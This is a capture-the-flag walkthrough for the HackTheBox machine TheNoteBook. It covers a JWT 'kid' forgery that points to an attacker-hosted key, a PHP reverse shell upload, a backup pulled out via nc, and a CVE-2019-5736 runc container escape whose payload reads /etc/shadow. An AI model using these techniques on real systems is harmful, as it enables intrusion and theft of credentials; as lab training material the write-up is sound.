# TheNoteBook - HackTheBox
Linux, 30 Base Points, Medium

## Machine

![TheNoteBook.JPG](images/TheNoteBook.JPG)

## TL;DR;
To solve this machine, we begin by enumerating open services using namp – finding ports 80, 22, 10010.

***User:*** Find JWT token with ```"kid":"http://localhost:7070/privKey.key"``` value, Sign new JWT token with our private key and get access to ```/admin``` page as admin role, Uploading PHP web shell and got shell as ```www-data```, Found ```/var/backups/home.tar.gz``` with ```noah``` ssh private key.

***Root:*** By running sudo -l, we learn we are able to run ```/usr/bin/docker exec -it webapp-dev01*``` as root, Get exec to running container and use [CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC) to read the root flag.

## TheNoteBook Solution

### User

So let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $nmap -sC -sV -oA nmap/TheNoteNook 10.10.10.230
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-23 00:27 IST
Nmap scan report for 10.10.10.230
Host is up (0.085s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp    open     http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
10010/tcp filtered rxapi
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.59 seconds

```

Port 80 contains the following website:

![port80.JPG](images/port80.JPG)

```gobuster``` on ```http://10.10.10.230``` give us the following results:
```console
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.230
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,log,txt
[+] Timeout:        10s
===============================================================
2021/03/23 00:58:00 Starting gobuster
===============================================================
/login (Status: 200)
/register (Status: 200)
/admin (Status: 403)
/logout (Status: 302)
Progress: 114644 / 220561 (51.98%)^C[A
[!] Keyboard interrupt detected, terminating.
===============================================================
2021/03/23 01:58:47 Finished
===============================================================
```

So It's mean we have also ```/admin``` page that we need to access it (currently - 403 forbidden).

Let's back to web site -
If we clicked on Notes -> Add Notes we got the following page:

![addnote.JPG](images/addnote.JPG)

Let's intercept this request using ```BurpSuite```:

![burp_addnote.JPG](images/burp_addnote.JPG)

We can see the following request:
```http
POST /94ca617e-44eb-4b32-8935-e88872a3af50/notes/add HTTP/1.1
Host: 10.10.10.230
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Origin: http://10.10.10.230
DNT: 1
Connection: close
Referer: http://10.10.10.230/94ca617e-44eb-4b32-8935-e88872a3af50/notes/add
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImV2eWF0YXIiLCJlbWFpbCI6ImV2eWF0YXJAaHRiLmNvbSIsImFkbWluX2NhcCI6MH0.BLJCCp7OTvIqrjWRiCZNlGKi5pposmlszjqQMpRyySzpV66LloGMYEe8Q-dYaiaoYQWenJUDcZJJ_BMmt80qv4JF72RbVE_QH5y6gqbgy4x6lljwtnCWx7jNXfKnrSLZ-Zz1jDs1E89Vn3RAIWXWfhFIT2VMJHbjOAKQWOmd9r2ng0wSK-x2DpOJbeU3xoqsLkzYRK0zu-41cA9zz3nI9gh6EiibFf7UgXIjhZmthKa9aRdGJ8RIoyecUlXg4wxwn3UklkhKA-n0LVjzVXrohO30rSBroEZH3-Lae98VhP7tvO_JCrQsrKOlkncADIgBOJ7N4fNUXVxCJcvzAWjP70WEGcTP4E56r1IOgdGuqJZTwEh9WaudQeDk12NUldaZgUPAWP3x7ULbFNps2lGe0NaH8WbOC59EuL92DK-iVRpIseanevKpMhsNjJz63QfTgGoe-vKRVIwp6-Qcws-mHX7aon5yGc2TElKLo9jzvmfbATwSi_JbYOE_h2CMZbyrHbswQNTetsINuLTtjOznmRC8MQnIY-ttEeaWifyVVGzhhO-EPpGDbjxw1dZcD0ITZ-IaoM9yVXTqURAqWYQ8rSb5LG3thuapjc58hpPc_VWq-KT_9fOwqN_ZqVmWcpNYGno_p4mN6vC5RIBPZTD_dcK5wzXD8YxpyBw2wHvTf6g; uuid=94ca617e-44eb-4b32-8935-e88872a3af50
Upgrade-Insecure-Requests: 1

title=test&note=test
```

```auth``` cookie looks like JWT token:
```json
auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6ImV2eWF0YXIiLCJlbWFpbCI6ImV2eWF0YXJAaHRiLmNvbSIsImFkbWluX2NhcCI6MH0.BLJCCp7OTvIqrjWRiCZNlGKi5pposmlszjqQMpRyySzpV66LloGMYEe8Q-dYaiaoYQWenJUDcZJJ_BMmt80qv4JF72RbVE_QH5y6gqbgy4x6lljwtnCWx7jNXfKnrSLZ-Zz1jDs1E89Vn3RAIWXWfhFIT2VMJHbjOAKQWOmd9r2ng0wSK-x2DpOJbeU3xoqsLkzYRK0zu-41cA9zz3nI9gh6EiibFf7UgXIjhZmthKa9aRdGJ8RIoyecUlXg4wxwn3UklkhKA-n0LVjzVXrohO30rSBroEZH3-Lae98VhP7tvO_JCrQsrKOlkncADIgBOJ7N4fNUXVxCJcvzAWjP70WEGcTP4E56r1IOgdGuqJZTwEh9WaudQeDk12NUldaZgUPAWP3x7ULbFNps2lGe0NaH8WbOC59EuL92DK-iVRpIseanevKpMhsNjJz63QfTgGoe-vKRVIwp6-Qcws-mHX7aon5yGc2TElKLo9jzvmfbATwSi_JbYOE_h2CMZbyrHbswQNTetsINuLTtjOznmRC8MQnIY-ttEeaWifyVVGzhhO-EPpGDbjxw1dZcD0ITZ-IaoM9yVXTqURAqWYQ8rSb5LG3thuapjc58hpPc_VWq-KT_9fOwqN_ZqVmWcpNYGno_p4mN6vC5RIBPZTD_dcK5wzXD8YxpyBw2wHvTf6g;
```

Let's try to decode it using base64 decode:
```json
{"typ":"JWT","alg":"RS256","kid":"http://localhost:7070/privKey.key"}{"username":"evyatar","email":"evyatar@htb.com","admin_cap":0},§³¼«db	e¨¹¦,[3¤¥²K:Uë¢å cïu¢jYéÉP7$Lß4ªþ	½mQº¦àËzXð¶pÇ¸Í]ò§­"Ùg=cÍDóÕgÝYuRÙS	¸Î
```

Ok, So we can see the ```kid``` header [https://tools.ietf.org/html/rfc7515#section-4.1.4](https://tools.ietf.org/html/rfc7515#section-4.1.4).

The "kid" (key ID) Header Parameter is a hint indicating which key was used to secure the JWS.
This parameter allows originators to explicitly signal a change of key to recipients.  The structure of the "kid" value is unspecified.  Its value MUST be a case-sensitive string.  When used with a JWK, the "kid" value is used to match a JWK "kid" parameter value.

So It's mean we can create our JWT token and sign it with our key!

We want to get admin access so let's try to change the ```kid``` to our IP with our private key, the ```username``` to ```admin``` and ```admin_cap``` to be ```true```:
```json
{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.14:7070/privKey.key"}{"username":"evyatar","email":"evyatar@htb.com","admin_cap":true}
``` 

Now, We need to "sign" this JWT header+payload.

We can do it using [jwt.io](https://jwt.io) website, but first, we need to create private key using ```ssh-keygen```:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in jwtRS256.key
Your public key has been saved in jwtRS256.key.pub
The key fingerprint is:
SHA256:I/R3714l8vHQbQrUtBnlzTU7H/hyjm5qtGArW2uWD/k user@parrot
The key's randomart image is:
+---[RSA 4096]----+
|              ooo|
|             o.*=|
|      .     ..+++|
|     . .   .  ..=|
|      . S . +.+o*|
|       . =.o ==B.|
|        .+= ..+.o|
|       ..=+o.o . |
|       .=.oEooo  |
+----[SHA256]-----+
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $ openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
writing RSA key
```

We want also to change the name of ```jwtRS256.key``` to ```privKey.key``` (optional).

Great, Now we have private key and we have the request payload, so let's create a new JWT token using [jwt.io](https://jwt.io):

![jwtio.JPG](images/jwtio.JPG)

We need to put the header + payload and the private key.

We need also to listen to port 8000 and wait to server request to get the ```privKey.key```:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now, Let's try to browse to ```http://10.10.10.230/admin``` and intercept this request using ```Burp``` and change the ```auth``` cookie:

![auth.JPG](images/auth.JPG) 

We got server request:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.230 - - [23/Mar/2021 03:05:32] "GET /privKey.key HTTP/1.1" 200 -
```
And we got the admin page successfully:

![admin.JPG](images/admin.JPG)

Let's try to click on ```Upload File``` button (intercept the request and change the ```auth``` cookie again:

![upload.JPG](images/upload.JPG)

So now, we can upload php shell [http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz](http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz):

![shellupload.JPG](images/shellupload.JPG)

Start ```nc``` listener:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $nc -lvp 1234
listening on [any] 1234 ...

```

And Click on "View" button (also intercept the request and change ```auth``` token), and we got shell:

```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook]
└──╼ $nc -lvp 1234
listening on [any] 1234 ...
10.10.10.230: inverse host lookup failed: Unknown host
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.230] 43298
Linux thenotebook 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 01:39:57 up  3:13,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

From [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) we can see ```/var/backups/home.tar.gz``` file.

We can get hint for this file without ```linpeas```.

Let's click on ```Notes``` on web page with ```admin``` token and we will see:

![backupsnotes.JPG](images/backupsnotes.JPG)

And we know the backups file usually located on ```/var/backup```.

So let's get ```home.tar.gz``` file using ```nc```:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/backups]
└──╼ $nc -lvp 1111 > home.tar.gz
```

And from ```www-data``` shell:
```console
$ cd /var/backups
$ ls
apt.extended_states.0
apt.extended_states.1.gz
apt.extended_states.2.gz
home.tar.gz
$ nc 10.10.14.14 1111 < home.tar.gz
```

Let's look at ```home.tar.gz``` file:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/backups]
└──╼ $tar xvf home.tar.gz 
home/
home/noah/
home/noah/.bash_logout
home/noah/.cache/
home/noah/.cache/motd.legal-displayed
home/noah/.gnupg/
home/noah/.gnupg/private-keys-v1.d/
home/noah/.bashrc
home/noah/.profile
home/noah/.ssh/
home/noah/.ssh/id_rsa
home/noah/.ssh/authorized_keys
home/noah/.ssh/id_rsa.pub
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/backups]
└──╼ $
```

As we can see we have ```noah``` ssh private key, let's use it to get user flag:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/]
└──╼ $cp backups/home/noah/.ssh/id_rsa .
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/]
└──╼ $ssh -i id_rsa noah@10.10.10.230
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.10.230 (10.10.10.230)' can't be established.
ECDSA key fingerprint is SHA256:GHcgekaLnxmzAeBtBN8jWgd3DME3eniUb0l+PDmejDQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.230' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Mar 23 20:52:55 UTC 2021

  System load:  1.07              Processes:              181
  Usage of /:   40.0% of 7.81GB   Users logged in:        0
  Memory usage: 18%               IP address for ens160:  10.10.10.230
  Swap usage:   0%                IP address for docker0: 172.17.0.1


61 packages can be updated.
0 updates are security updates.


Last login: Wed Feb 24 09:09:34 2021 from 10.10.14.5
noah@thenotebook:~$ cat user.txt 
8a5c88f0f280da56aa628d1fac9d16d4
noah@thenotebook:~$ 
```

And we get the user flag ```8a5c88f0f280da56aa628d1fac9d16d4```.

### Root

So now we have ```noah``` user, Let's check what we can do:
```console
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
noah@thenotebook:~$ 
```

```*``` at the end say we can run and command after ```/usr/bin/docker exec -it webapp-dev01 ```, so let's get container shell 

using:
```console
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
root@0f4c2517af40:/opt/webapp#
```

So if we have permission to run ```docker exec``` as root we can use the following exploit [https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC).

How does the exploit work?


There are 2 use cases for the exploit. The first (which is what this repo is), is essentially a trap. An attacker would need to get command execution inside a container and start a malicious binary which would listen. When someone (attacker or victim) uses docker exec to get into the container, this will trigger the exploit which will allow code execution as root.


So let's use this exploit:
```console
┌─[user@parrot]─[/hackthebox/TheNoteBook/container]
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/]
Cloning into 'CVE-2019-5736-PoC'...
remote: Enumerating objects: 45, done.
remote: Total 45 (delta 0), reused 0 (delta 0), pack-reused 45
Unpacking objects: 100% (45/45), 1.69 MiB | 2.48 MiB/s, done.
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/]
└──╼ $cd CVE-2019-5736-PoC/
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/CVE-2019-5736-PoC/]
└──╼ $ls
main.go  README.md  screenshots
```

Now, we need to change main.go code from:
```go
...
var payload = "#!/bin/bash \n cat /etc/shadow > /tmp/shadow && chmod 777 /tmp/shadow"
...
```

To:
```go
...
var payload = "#!/bin/bash \n cat /root/root.txt > /tmp/rootflag && chmod 777 /tmp/rootflag"
...
```
 
After that change, let's compile it:
```console
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/CVE-2019-5736-PoC/]
└──╼ $go build main.go 
┌─[evyatar@parrot]─[/hackthebox/TheNoteBook/CVE-2019-5736-PoC/]
└──╼ $
```

Listen to port 8000 and get the file ```main``` from container:
```console
# noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
# cd /tmp
# ls
requirements.txt  webapp.db
# curl http://10.10.14.34:8000/main > main
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2216k  100 2216k    0     0  1266k      0  0:00:01  0:00:01 --:--:-- 1266k
# chmod +x main
# ./main
[+] Overwritten /bin/sh successfully
[+] Found the PID: 29
[+] Successfully got the file handle
[+] Successfully got write handle &{0xc000308060}
#
```

And run ```docker exec``` command from ```noah``` shell:
```console
noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
No help topic for '/bin/sh'
noah@thenotebook:~$ cat /root/rootflag
d502ae5178936996ec48db79a73b7074
```

And we get the root flag ```d502ae5178936996ec48db79a73b7074```.